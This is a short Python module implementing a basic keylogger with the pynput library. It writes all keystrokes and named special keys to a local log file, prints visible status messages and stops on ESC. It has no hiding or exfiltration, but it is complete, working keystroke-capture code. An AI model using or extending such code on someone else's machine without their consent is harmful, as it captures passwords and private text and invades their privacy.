"""
Basic Keylogger Module
Records and logs keystrokes to a file with advanced features
"""

from pynput import keyboard
from datetime import datetime
import os
import json
from pathlib import Path


class Keylogger:
    """Basic keylogger class that captures and logs keystrokes"""
    
    def __init__(self, log_file="logs/keylog.txt"):
        """
        Initialize the keylogger
        
        Args:
            log_file (str): Path where keystrokes will be logged
        """
        self.log_file = log_file
        self.listener = None
        self.is_running = False
        
        # Create logs directory if it doesn't exist
        Path(self.log_file).parent.mkdir(parents=True, exist_ok=True)
    
    def log_keystroke(self, key_char):
        """
        Log a keystroke to the file
        
        Args:
            key_char (str): The character to log
        """
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(key_char)
                f.flush()
        except Exception as e:
            print(f"Error logging keystroke: {e}")
    
    def on_press(self, key):
        """
        Callback function when a key is pressed
        
        Args:
            key: The key object from pynput
        """
        try:
            # Try to get the character representation
            if hasattr(key, 'char') and key.char:
                self.log_keystroke(key.char)
            else:
                # Handle special keys
                if key == keyboard.Key.space:
                    self.log_keystroke(' ')
                elif key == keyboard.Key.enter:
                    self.log_keystroke('\n')
                elif key == keyboard.Key.tab:
                    self.log_keystroke('\t')
                elif key == keyboard.Key.backspace:
                    self.log_keystroke('[BACKSPACE]')
                elif key == keyboard.Key.delete:
                    self.log_keystroke('[DELETE]')
                elif key == keyboard.Key.shift:
                    self.log_keystroke('[SHIFT]')
                elif key == keyboard.Key.ctrl:
                    self.log_keystroke('[CTRL]')
                elif key == keyboard.Key.alt:
                    self.log_keystroke('[ALT]')
                elif key == keyboard.Key.cmd or key == keyboard.Key.cmd_r:
                    self.log_keystroke('[WIN]')
                elif key == keyboard.Key.up:
                    self.log_keystroke('[UP]')
                elif key == keyboard.Key.down:
                    self.log_keystroke('[DOWN]')
                elif key == keyboard.Key.left:
                    self.log_keystroke('[LEFT]')
                elif key == keyboard.Key.right:
                    self.log_keystroke('[RIGHT]')
        except AttributeError:
            pass
    
    def on_release(self, key):
        """
        Callback function when a key is released
        
        Args:
            key: The key object from pynput
        """
        # Stop listener on ESC key
        if key == keyboard.Key.esc:
            return False
    
    def start(self):
        """Start listening to keyboard"""
        if not self.is_running:
            self.is_running = True
            print(f"[*] Keylogger started. Logging to {self.log_file}")
            print("[*] Press ESC to stop the keylogger")
            
            self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.listener.start()
            self.listener.join()  # Block until stopped
            self.is_running = False
    
    def stop(self):
        """Stop listening to keyboard"""
        if self.listener:
            self.listener.stop()
            self.is_running = False
            print("[*] Keylogger stopped")


if __name__ == "__main__":
    logger = Keylogger()
    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
        print("\n[*] Keylogger terminated")
